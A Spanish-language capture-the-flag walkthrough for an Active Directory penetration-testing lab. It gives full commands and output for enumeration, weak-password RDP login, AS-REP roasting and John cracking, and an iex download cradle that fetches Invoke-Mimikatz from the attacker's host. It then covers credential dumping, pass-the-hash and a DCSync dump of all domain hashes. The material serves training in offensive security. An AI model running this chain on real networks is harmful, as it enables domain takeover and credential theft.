
# Active Directory Penetration Testing CTF 1

## <mark style="color:$primary;">Introducción</mark>

Este laboratorio se centra en explotar las vulnerabilidades de Active Directory para obtener acceso no autorizado, escalar privilegios y capturar flags ocultas. Utilizarás diversas técnicas, como ataques de contraseñas, cracking de hashes, enumeración de privilegios y ataques Pass-the-Hash, para navegar por la red y obtener credenciales confidenciales. Tu objetivo es identificar las debilidades del entorno de Active Directory y completar con éxito todas las tareas.

En este laboratorio solo disponemos de una máquina Windows como máquina de atacante, no tenemos Kali Linux:

<figure><img src="/files/k9aTanzdktsOz6zyZrDj" alt=""><figcaption></figcaption></figure>

### Tools

Tenemos todas las herramientas disponibles en la ruta `C:/Tools`:

```powershell
PS C:\Tools> ls

    Directory: C:\Tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/25/2023  12:31 PM                ADModule
d-----         7/5/2023   9:43 AM                Cracker
d-----        6/25/2023  12:31 PM                Ghostpack-CompiledBinaries
d-----        6/25/2023  12:32 PM                hashcat
d-----        6/25/2023  12:32 PM                impacket
d-----        6/25/2023  12:32 PM                impacket-windows-binaries
d-----        6/25/2023  12:32 PM                kekeo
d-----        6/25/2023  12:32 PM                kekeo_one
d-----        6/25/2023  12:32 PM                kerberoast-Python2
d-----        6/25/2023  12:32 PM                kerberoast-Python3
d-----        6/25/2023  12:32 PM                Nishang
d-----        6/25/2023  12:32 PM                PowerShell-Suite
d-----        6/25/2023  12:32 PM                PowerShell_IPv4NetworkScanner
d-----        6/25/2023  12:32 PM                Scripts
d-----        6/25/2023  12:33 PM                SecLists
d-----        6/25/2023  12:33 PM                Timeroast
-a----        6/25/2023  12:31 PM          83225 10k-worst-pass.txt
-a----        6/25/2023  12:31 PM         558046 ADACLScan.ps1
-a----        6/25/2023  12:31 PM         199168 Akagi64.exe
-a----        6/25/2023  12:31 PM         506793 ASREPRoast-master.zip
-a----        6/25/2023  12:31 PM          14690 doc.chm
-a----        6/25/2023  12:31 PM           1318 encoded.txt
-a----        6/25/2023  12:31 PM           4814 encodedcommand.txt
-a----        6/25/2023  12:31 PM           6325 Execute-Command-MSSQL.ps1
-a----        6/25/2023  12:31 PM           9693 Find-PSServiceAccounts.ps1
-a----        6/25/2023  12:31 PM           2126 Find-WMILocalAdminAccess.ps1
-a----        6/25/2023  12:31 PM        5961778 HeidiSQL_9.4_Portable.zip
-a----        6/25/2023  12:31 PM        2501632 hfs.exe
-a----        6/25/2023  12:31 PM           4722 Invoke-Encode.ps1
-a----        6/25/2023  12:31 PM        3190829 Invoke-Mimikatz.ps1
-a----        6/25/2023  12:31 PM           4339 Invoke-PowerShellTcp.ps1
-a----        6/25/2023  12:31 PM            975 Invoke-PowerShellTcpOneLine_443.ps1
-a----        6/25/2023  12:31 PM          94961 Invoke-TokenManipulation.ps1
-a----        6/25/2023  12:31 PM       65376163 johnTheRipper.zip
-a----        6/25/2023  12:31 PM        1123514 kekeo.zip
-a----        6/25/2023  12:31 PM         453532 kekeo_one.zip
-a----        6/25/2023  12:31 PM        1253993 mimikatz.zip
-a----        6/25/2023  12:31 PM         111892 Netcat.zip
-a----        6/25/2023  12:31 PM          19502 Out-CHM.ps1
-a----        6/25/2023  12:31 PM          37641 powercat.ps1
-a----        6/25/2023  12:31 PM          35822 Powermad.zip
-a----        6/25/2023  12:31 PM              0 PowerSploit.zip
-a----        6/25/2023  12:31 PM         351421 PowerUp.ps1
-a----        6/25/2023  12:31 PM        1181811 PowerUpSQL.ps1
-a----        6/25/2023  12:31 PM       17902620 PowerUpSQL.zip
-a----        6/25/2023  12:31 PM         769757 PowerView.ps1
-a----        6/25/2023  12:31 PM         790661 PowerView_dev.ps1
-a----        6/25/2023  12:31 PM        1078672 PsExec64.exe
-a----        6/25/2023  12:31 PM           2418 reverse.bat
-a----        6/25/2023  12:31 PM         348672 rotten.exe
-a----        6/25/2023  12:31 PM         454144 Rubeus.exe
-a----        6/25/2023  12:31 PM           8967 Set-DCShadowPermissions.ps1
-a----        6/25/2023  12:31 PM         736256 SharpView.exe
-a----        6/25/2023  12:31 PM         103925 subinacl.zip
-a----        6/25/2023  12:31 PM       44493091 SysinternalsSuite.zip
```

***

## <mark style="color:$primary;">Tarea 1</mark>

> Es posible que uno de los usuarios del dominio haya elegido una contraseña débil, como password1. Localice la primera señal de alerta buscando otras máquinas en la red e intentando iniciar sesión mediante la utilidad RDP.

### Enumeración de usuarios

```powershell
PS C:\Tools> powershell -ep bypass
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser | select samaccountname

samaccountname
--------------
Administrator
Guest
student
krbtgt
bobby
johnny
```

### Enumeración del dominio

```powershell
PS C:\Tools> Get-Domain

Forest                  : security.local
DomainControllers       : {prod.research.security.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : security.local
PdcRoleOwner            : prod.research.security.local
RidRoleOwner            : prod.research.security.local
InfrastructureRoleOwner : prod.research.security.local
Name                    : research.security.local
```

### Ver equipos en la red

Estamos en la red: `10.0.5.0/24`

```
PS C:\Tools> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : research.security.local
   Link-local IPv6 Address . . . . . : fe80::1c33:e8ed:99f7:4064%7
   IPv4 Address. . . . . . . . . . . : 10.0.5.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.5.1
```

### Ping Sweep con Powershell

```powershell
for ($i=1; $i -le 254; $i++) { 
    $ip = "10.0.5.$i"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        Write-Host "$ip is alive"
    }
}

10.0.5.1 is alive
```

Encontramos una máquina que está alive en nuestra red, posiblemente el DC (siempre suele estar en las IPs más bajas).

### Impersonar usuarios por RDP

Usando Remote Desktop Connection observamos que hay un usuario pre-logueado `bobby`:

<figure><img src="/files/kQvZ3UqiqBrSiSujms0Z" alt=""><figcaption></figcaption></figure>

Y con la contraseña `password1` conseguimos acceder y obtenemos la flag 1 en el escritorio:

<figure><img src="/files/RkDLQNDHPAIDtRNRBBTa" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Tarea 2</mark>

> Identificar las cuentas con la opción "Do not require preauthentication" habilitada.

### Usuarios AS-REP Roasteables

```powershell
PS C:\Tools> Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, name

samaccountname userprincipalname              name
-------------- -----------------              ----
johnny         johnny@research.security.local johnny
```

Encontramos al usuario johnny con cuenta AR-REP Roasteable. Ahora vamos a **explotar** esta vulnerabilidad para obtener el hash AS-REP de `johnny` y luego crackearlo para obtener su contraseña en texto claro.

### AS-REP Roasting con Rubeus

```powershell
PS C:\Tools> .\Rubeus.exe asreproast /user:johnny /format:john /outfile:johnny_asrep.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: AS-REP roasting

[*] Target User            : johnny
[*] Target Domain          : research.security.local

[*] Searching path 'LDAP://prod.research.security.local/DC=research,DC=security,DC=local' for '(&(samAccoun68)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=johnny))'
[*] SamAccountName         : johnny
[*] DistinguishedName      : CN=johnny,CN=Users,DC=research,DC=security,DC=local
[*] Using domain controller: prod.research.security.local (10.0.0.165)
[*] Building AS-REQ (w/o preauth) for: 'research.security.local\johnny'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Tools\johnny_asrep.txt

[*] Roasted hashes written to : C:\Tools\johnny_asrep.txt
```

```powershell
PS C:\Tools> cat .\johnny_asrep.txt
$krb5asrep$johnny@research.security.local:2DA526BDC37BC1D604B479E49DED880E$E77A385DBA1E156065BEB7D0584B018658E1B01E05B63
349EA69A8EADF3788A9CCE7F96A8D2838829AA8E0C2BF5A43F5F515EE647BD620DDE596DB6CC69F3539B81FC1AEEDEB5F55D5B6AC88ECBF0C88CB136
D349E91938FEFB39642F7D213559C894B60F3E465013E11D5206793A97BD4BF1286BC20EA6D6CDCD6D1D31683FFB074AB03222F2EE7DFA27AC84114A
E81FD4ABB8C6C0E2895A55219E7AAEBCF33AE29CB3D1A62EDA4547BADBBC7002480A1084FD2394FA7E894D908E66A1AAEDDC4BD2796A5ABCE98EF831
8FB716C9BC19DA50A19DA696FF3F6EF7C37173DE242A586EFDE4BD33E87FE592178845006DD97847F926CE53FE21DDAD7696788623E2CE5
```

### Cracking con John

Debemos descomprimir la carpeta `johnTheRipper.exe` de `C:/Tools` y copiar el hash dentro de la nueva carpeta de john o especificar la ruta absoluta:

```
C:\Tools\johnTheRipper\john-1.9.0-jumbo-1-win64\run
```

```powershell
PS C:\Tools\johnTheRipper\john-1.9.0-jumbo-1-win64\run> .\john.exe --format=krb5asrep --wordlist=C:/Tools/10k-worst-p.txt johnny_asrep.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256
2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           ($krb5asrep$johnny@research.security.local)
1g 0:00:00:00 DONE (2026-04-29 12:17) 5.952g/s 3047p/s 3047c/s 3047C/s password..kitty
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obtenemos la contraseña en plano del usuario johnny, con el que accederemos por RDP para obtener la flag 2:

<figure><img src="/files/G3R6SQbWfbuZqHPzsivl" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Tarea 3</mark>

> Enumerar los privilegios de administrador de dominio y local y establecer una sesión remota.

### Encontrar Local Admins

```powershell
PS C:\Tools> Find-LocalAdminAccess
seclogs.research.security.local
```

### Powershell Remoting

```
PS C:\Tools> Enter-PSSession seclogs.research.security.local
[seclogs.research.security.local]: PS C:\Users\student.RESEARCH\Documents> hostname
seclogs
```

Podemos encontrar la flag 3 en `C:/`

```powershell
[seclogs.research.security.local]: PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2018   6:56 AM                EFI
d-----        6/25/2023  12:35 PM                metasploit-framework
d-----        5/13/2020   5:58 PM                PerfLogs
d-r---         3/4/2025   6:35 AM                Program Files
d-----         3/4/2025   6:35 AM                Program Files (x86)
d-----        6/25/2023  12:35 PM                Python27
d-r---        2/28/2025  10:08 AM                Users
d-----        6/25/2023  12:36 PM                Windows
-a----         3/5/2025   6:44 AM             32 Flag3.txt

[seclogs.research.security.local]: PS C:\> cat .\Flag3.txt
69d92fbe2fc42f9ebbac83faf5b37202
```

***

## <mark style="color:$primary;">Tarea 4</mark>

> Extraer y utilizar el hash NTLM de una cuenta de máquina vulnerable para obtener acceso al controlador de dominio.

### HFS Server

Enviaremos los programas que queramos al Powershell Remoting de seclogs:

<figure><img src="/files/cQ7vK9TAhjeWGY1XJsg1" alt=""><figcaption></figcaption></figure>

### Invoke Mimikatz

```powershell
[seclogs.research.security.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
[seclogs.research.security.local]: PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'

Hostname: seclogs.research.security.local / S-1-5-21-886037013-3317003867-2014356223

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

516     {0;000003e7} 1 D 21136          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;001061c7} 0 D 1074314     RESEARCH\student        S-1-5-21-886037013-3317003867-2014356223-1008(09g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1125622     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)   Impersonation (Delegation)

mimikatz(powershell) # sekurlsa::logonpasswords

<----SNIP---->

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : seclog
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 4/29/2026 11:34:49 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 5f44fe3ddb4c1522fc93d9e8********
         * SHA1     : 6afa0eae182a0e23a83c16a8da3512413d46ccef
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : seclogs$
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : 73 1d d2 14 3f d3 71 ab 33 19 99 cf 68 6e 4a 5a dd e6 06 f6 e8 b5 d6 e0 90 85 88 71 00 89 02 70 d2
 1a 17 f9 3c f5 cd 82 32 f8 f4 79 85 be 1b 3f 4d d0 a9 c6 38 87 b7 d8 e1 81 a9 b0 09 c9 63 3b c2 68 cd 32 db 6e bc d0 3e
 9f 90 10 a2 7c 10 ff 3e 5e 65 55 50 ce 8f a5 d3 5f 8b 9a 4c 8e 07 74 02 37 63 32 72 39 a7 f1 a9 59 c2 d5 ae 9c b9 eb 93
 68 ee 3e 38 f3 39 98 dc e7 5f f6 a0 bf 35 4c 97 e9 fd a2 32 02 e7 01 a5 a9 e4 5a be 38 5d 08 42 b3 02 83 ed 10 8a 4c b0
 53 c7 78 6c a7 b1 d8 1a 71 6c 1b 3e 0f 48 31 5c 6a 8b d0 62 9f f4 d4 33 c6 58 0d 59 77 f8 69 95 3b cf fb dc 8c 88 d9 57
 f5 73 f2 ad f1 9e 85 02 29 32 91 7b b6 55 41 44 ab ff 77 4c e5 d7 58 84 c5 27 6d 73 d8 32 a4 c5 43 a0 e9 c7 85 1d 2d 9d
 0c 19 3a 7e 73 ea d3
 
 <----SNIP---->
```

No hay ninguna cuenta "Administrator", pero encontramos una cuenta de servicio SECLOGS$ y obtenemos su hash NTLM.

### Pass the Hash

Abrimos una nueva Powershell como administrador:

```ps
PS C:\Tools> powershell -ep bypass
PS C:\Tools> . .\Invoke-Mimikatz.ps1
PS C:\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:seclogs /domain:research.security.local /ntlm:5f44fe3ddb4c1522fc93d9e8******** /run:powershell.exe"'
```

Eso nos abre una nueva powershell como admin y el usuario seclogs:

<figure><img src="/files/hqba15jil5eXaKx1Uhle" alt=""><figcaption></figcaption></figure>

### Acceso al Domain Controller

Dentro de esta Powershell como Administrator podemos acceder directamente al Domain Controller usando `Enter-PSSession` y obtener la última flag:

```powershell
PS C:\> Enter-PSSession prod.RESEARCH.security.local
[prod.RESEARCH.security.local]: PS C:\Users\SECLOGS$\Documents> cd c:/
[prod.RESEARCH.security.local]: PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2018   6:56 AM                EFI
d-----        5/13/2020   5:58 PM                PerfLogs
d-r---        11/7/2020   7:47 AM                Program Files
d-----        11/7/2020   7:47 AM                Program Files (x86)
d-r---        4/29/2026   1:02 PM                Users
d-----        6/25/2023   4:18 PM                Windows
-a----         3/5/2025   6:46 AM             32 Flag4.txt
-a----        2/28/2025   9:30 AM           8622 secconfig.cfg
-a----        2/28/2025   9:33 AM           8601 secpol.cfg

[prod.RESEARCH.security.local]: PS C:\> cat .\Flag4.txt
df62bb8af9001d0ff0caaa26********
```

### Hashdump

En este punto podemos hacer un hashdump con Mimikatz directamente en el DC:

```powershell
[prod.RESEARCH.security.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
[prod.RESEARCH.security.local]: PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:research.security.local /all"'

Hostname: prod.research.security.local / S-1-5-21-886037013-3317003867-2014356223

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # lsadump::dcsync /domain:research.security.local /all
[DC] 'research.security.local' will be the domain
[DC] 'prod.research.security.local' will be the DC server
[DC] Exporting domain 'research.security.local'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

<----SNIP---->

SAM Username         : SECURITY$
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-886037013-3317003867-2014356223-1112
Object Relative ID   : 1112

Credentials:
  Hash NTLM: 8b58829cd27bfd6994cba6552942beb0
  
SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-886037013-3317003867-2014356223-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 093a3a3b91911457b2300717d4e6f2bd

SAM Username         : Administrator
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-886037013-3317003867-2014356223-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 38a08b8218669328bf7b82bdff3b81d9
  
SAM Username         : PROD$
User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
Object Security ID   : S-1-5-21-886037013-3317003867-2014356223-1009
Object Relative ID   : 1009

Credentials:
  Hash NTLM: 1eef9a4d629639598a632617d0b150b2
  
<----SNIP---->
```

Obtenemos todos los hashes de todos los usuarios del dominio, estando completamente comprometido.

### Pass the Hash como Administrator

```powershell
PS C:\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:318669328bf7b82bdff3b81d9 /run:powershell.exe"'
```

En la nueva powershell que nos abre:

```powershell
PS C:\Windows\system32> Enter-PSSession prod.RESEARCH.security.local

[prod.RESEARCH.security.local]: PS C:\> whoami
research\administrator

[prod.RESEARCH.security.local]: PS C:\Users\Administrator> ls

    Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/24/2023   9:26 AM                3D Objects
d-r---        6/24/2023   9:26 AM                Contacts
d-r---         3/4/2025   8:17 AM                Desktop
d-r---        6/24/2023   9:26 AM                Documents
d-r---        6/24/2023   9:26 AM                Downloads
d-r---        6/24/2023   9:26 AM                Favorites
d-r---        6/24/2023   9:26 AM                Links
d-r---        6/24/2023   9:26 AM                Music
d-r---        6/24/2023   9:26 AM                Pictures
d-r---        6/24/2023   9:26 AM                Saved Games
d-r---        6/24/2023   9:26 AM                Searches
d-r---        6/24/2023   9:26 AM                Videos
```
